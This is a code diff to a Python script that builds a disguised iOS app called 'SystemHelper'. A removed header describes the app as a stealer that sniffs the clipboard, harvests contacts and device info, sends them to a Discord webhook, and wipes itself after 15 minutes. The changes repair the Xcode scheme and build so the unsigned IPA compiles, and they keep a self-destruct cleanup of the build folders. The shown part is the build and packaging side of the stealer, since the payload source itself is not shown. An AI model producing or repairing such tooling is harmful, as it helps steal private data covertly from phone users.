@@ -1,10 +1,4 @@
 ﻿#!/usr/bin/env python3
-"""
-ios-stealer-builder
-payload:  clipboard sniffer + contacts + device info
-exfil:    discord webhook, chunked
-lifetime: 15 minutes on device, then hard self-wipe + exit
-"""
 import argparse
 import shutil
 import subprocess
@@ -17,7 +11,6 @@ BUNDLE_ID = "com.ofx.systemhelper"
 APP_NAME = "SystemHelper"
 BUNDLE_NAME = "SystemHelper.app"
 BUILD_DIR = Path("build")
-SRC_DIR = Path("src")
 OUT_IPA = Path(f"{APP_NAME}.ipa")
 
 MAIN_M = r'''
@@ -194,7 +187,6 @@ PBXPROJ = '''// !$*UTF8*$!
         AAAA0001 = {{isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = SystemHelper; sourceTree = BUILT_PRODUCTS_DIR; }};
         AAAA0002 = {{isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = SOURCE_ROOT; }};
         AAAA0003 = {{isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = SOURCE_ROOT; }};
-
         AAAA0004 = {{isa = PBXBuildFile; fileRef = AAAA0002; }};
 
         AAAA0010 = {{ isa = PBXGroup; children = (AAAA0002, AAAA0003, AAAA0011); sourceTree = "<group>"; }};
@@ -232,12 +224,20 @@ PBXPROJ = '''// !$*UTF8*$!
 
         AAAA0050 = {{
             isa = XCBuildConfiguration;
-            buildSettings = {{ ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = ""; INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}"; PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2"; }};
+            buildSettings = {{
+                ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = "";
+                INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}";
+                PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2";
+            }};
             name = Debug;
         }};
         AAAA0051 = {{
             isa = XCBuildConfiguration;
-            buildSettings = {{ ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = ""; INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}"; PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2"; }};
+            buildSettings = {{
+                ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = "";
+                INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}";
+                PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2";
+            }};
             name = Release;
         }};
         AAAA0060 = {{ isa = XCBuildConfiguration; buildSettings = {{ SDKROOT = iphoneos; }}; name = Debug; }};
@@ -250,23 +250,41 @@ PBXPROJ = '''// !$*UTF8*$!
 }}
 '''
 
+XSCHEME = '''<?xml version="1.0" encoding="UTF-8"?>
+<Scheme LastUpgradeVersion = "1500" version = "1.7">
+   <BuildAction parallelizeBuildables = "YES" buildImplicitDependencies = "YES">
+      <BuildActionEntries>
+         <BuildActionEntry buildForTesting = "YES" buildForRunning = "YES" buildForProfiling = "YES" buildForArchiving = "YES" buildForAnalyzing = "YES">
+            <BuildableReference
+               BuildableIdentifier = "primary"
+               BlueprintIdentifier = "AAAA0020"
+               BuildableName = "SystemHelper.app"
+               BlueprintName = "SystemHelper"
+               ReferencedContainer = "container:SystemHelper.xcodeproj">
+            </BuildableReference>
+         </BuildActionEntry>
+      </BuildActionEntries>
+   </BuildAction>
+</Scheme>
+'''
+
 def scaffold():
     if BUILD_DIR.exists(): shutil.rmtree(BUILD_DIR)
     proj = BUILD_DIR / f"{APP_NAME}.xcodeproj"
     BUILD_DIR.mkdir(parents=True)
-    SRC_DIR.mkdir(exist_ok=True)
     proj.mkdir(parents=True, exist_ok=True)
-    (proj / "xcshareddata").mkdir(parents=True, exist_ok=True)
-
-    main_m = MAIN_M.replace("__WEBHOOK__", WEBHOOK)
-    (BUILD_DIR / "main.m").write_text(main_m)
+    scheme_dir = proj / "xcshareddata" / "xcschemes"
+    scheme_dir.mkdir(parents=True, exist_ok=True)
+    
+    (BUILD_DIR / "main.m").write_text(MAIN_M.replace("__WEBHOOK__", WEBHOOK))
     (BUILD_DIR / "Info.plist").write_text(INFO_PLIST.format(BUNDLE_ID=BUNDLE_ID, APP_NAME=APP_NAME))
     (proj / "project.pbxproj").write_text(PBXPROJ.format(BUNDLE_ID=BUNDLE_ID))
+    (scheme_dir / f"{APP_NAME}.xcscheme").write_text(XSCHEME)
     print(f"[+] scaffolded {proj}")
 
 def build():
     if sys.platform != "darwin": sys.exit(f"[!] macOS only.")
-    cmd = ["xcodebuild", "-project", str(BUILD_DIR / f"{APP_NAME}.xcodeproj"), "-target", APP_NAME, "-configuration", "Release", "-sdk", "iphoneos", "-derivedDataPath", str(BUILD_DIR / "dd"), "CODE_SIGNING_ALLOWED=NO", "CODE_SIGNING_REQUIRED=NO", "CODE_SIGN_IDENTITY="]
+    cmd = ["xcodebuild", "-project", str(BUILD_DIR / f"{APP_NAME}.xcodeproj"), "-scheme", APP_NAME, "-configuration", "Release", "-sdk", "iphoneos", "-derivedDataPath", str(BUILD_DIR / "dd"), "CODE_SIGNING_ALLOWED=NO", "CODE_SIGNING_REQUIRED=NO", "CODE_SIGN_IDENTITY="]
     print("[*] xcodebuild…")
     r = subprocess.run(cmd, capture_output=True, text=True)
     if r.returncode != 0:
@@ -298,15 +316,14 @@ def main():
     if args.mode == "pack-only":
         pack_ipa()
         if args.self_destruct:
-            for t in [BUILD_DIR, SRC_DIR, Path("__pycache__")]:
+            for t in [BUILD_DIR, Path("__pycache__")]:
                 if t.exists(): shutil.rmtree(t)
         return
     scaffold()
     build()
     pack_ipa()
     if args.self_destruct:
-        for t in [BUILD_DIR, SRC_DIR, Path("__pycache__")]:
+        for t in [BUILD_DIR, Path("__pycache__")]:
             if t.exists(): shutil.rmtree(t)
 
 if __name__ == "__main__": main()
-
